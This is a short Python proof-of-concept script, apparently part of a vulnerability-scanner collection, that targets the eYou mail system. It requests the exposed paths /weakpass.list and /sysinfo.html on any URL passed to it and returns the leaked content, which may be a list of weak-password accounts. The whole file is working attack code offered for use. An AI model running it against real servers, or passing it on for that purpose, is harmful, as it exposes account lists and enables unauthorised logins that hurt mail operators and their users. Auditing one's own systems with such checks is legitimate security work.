#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 亿邮邮箱弱口令列表泄露
referer: http://wooyun.org/bugs/wooyun-2010-061538
author: Lucifer
description: 亿邮邮件系统存在弱口令账户信息泄露，导致非法登录
'''
import sys
import requests
import warnings
from termcolor import cprint

class eyou_weakpass_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "/weakpass.list"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
            if req.status_code == 200 and r"@" in req.text:
                cprint("[+]存在eyou邮件系统信息泄露...(敏感信息)\tpayload: "+vulnurl, "green")
                return True,vulnurl,"亿邮邮箱弱口令列表泄露",payload,req.text
            else:
                cprint("[-]不存在eyou_weakpass漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

        payload = "/sysinfo.html"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
            if req.status_code == 200 and r"系统基本信息检查" in req.text:
                cprint("[+]存在eyou邮件系统信息泄露...(敏感信息)\tpayload: "+vulnurl, "green")
                return True,vulnurl,"亿邮邮箱弱口令列表泄露",payload,req.text
            else:
                cprint("[-]不存在eyou_weakpass漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = eyou_weakpass_BaseVerify(sys.argv[1])
    testVuln.run()
